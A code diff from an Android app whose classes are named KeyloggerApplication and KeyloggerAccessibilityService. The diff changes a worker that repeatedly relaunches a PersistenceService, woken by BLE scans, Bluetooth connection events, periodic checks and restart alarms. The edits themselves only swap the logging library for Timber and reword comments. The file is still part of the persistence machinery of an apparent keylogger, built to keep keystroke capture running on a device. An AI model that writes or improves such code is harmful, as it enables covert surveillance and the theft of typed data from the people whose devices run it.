@@ -4,7 +4,6 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
-import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.work.CoroutineWorker
@@ -12,17 +11,19 @@ import androidx.work.ForegroundInfo
 import androidx.work.WorkerParameters
 import com.android.myapp.KeyloggerApplication
 import com.android.myapp.R
+import com.android.myapp.receiver.BluetoothEventReceiver
 import com.android.myapp.service.KeyloggerAccessibilityService
 import com.android.myapp.service.PersistenceService
+import timber.log.Timber
 
 /**
  * Service Check Worker - Ensures PersistenceService is running
  * 
  * This worker is triggered by various wake mechanisms:
  * - BLE scan results
- * - Bluetooth device connections
+ * - Bluetooth device connection events
  * - Periodic checks
- * - Alarms
+ * - Restart Alarms
  * 
  * It ensures the main PersistenceService is always running.
  */
@@ -40,15 +41,15 @@ class ServiceCheckWorker(
         val trigger = inputData.getString("trigger") ?: "unknown"
         val deviceCount = inputData.getInt("device_count", 0)
         val device = inputData.getString("device") ?: ""
-        
-        Log.d(TAG, "═══════════════════════════════════════")
-        Log.d(TAG, "ServiceCheckWorker executing")
-        Log.d(TAG, "  Trigger: $trigger")
-        Log.d(TAG, "  Device count: $deviceCount")
-        Log.d(TAG, "  Device: $device")
-        Log.d(TAG, "  Service running: ${KeyloggerAccessibilityService.isRunning}")
-        Log.d(TAG, "  Service running: ${PersistenceService.isRunning}")
-        Log.d(TAG, "═══════════════════════════════════════")
+
+        Timber.tag(TAG).d("═══════════════════════════════════════")
+        Timber.tag(TAG).d("ServiceCheckWorker executing")
+        Timber.tag(TAG).d("  Trigger: $trigger")
+        Timber.tag(TAG).d("  Device count: $deviceCount")
+        Timber.tag(TAG).d("  Device: $device")
+        Timber.tag(TAG).d("  Service running: ${KeyloggerAccessibilityService.isRunning}")
+        Timber.tag(TAG).d("  Service running: ${PersistenceService.isRunning}")
+        Timber.tag(TAG).d("═══════════════════════════════════════")
         
         // Store wake event
         context.getSharedPreferences("service_wake", Context.MODE_PRIVATE).edit()
@@ -58,10 +59,10 @@ class ServiceCheckWorker(
         
         // Start service if not running
         if (!PersistenceService.isRunning) {
-            Log.d(TAG, "Service not running, starting...")
+            Timber.tag(TAG).d("Service not running, starting...")
             startPersistenceService(trigger)
         } else {
-            Log.d(TAG, "Service already running ✓")
+            Timber.tag(TAG).d("Service already running ✓")
             
             // Notify service about the wake event
             PersistenceService.instance?.onBleDevicesSeen(deviceCount)
@@ -85,9 +86,9 @@ class ServiceCheckWorker(
             } else {
                 context.startService(intent)
             }
-            Log.d(TAG, "Service start requested")
+            Timber.tag(TAG).d("Service start requested")
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start service: ${e.message}")
+            Timber.tag(TAG).e("Failed to start service: ${e.message}")
             return
         }
     }
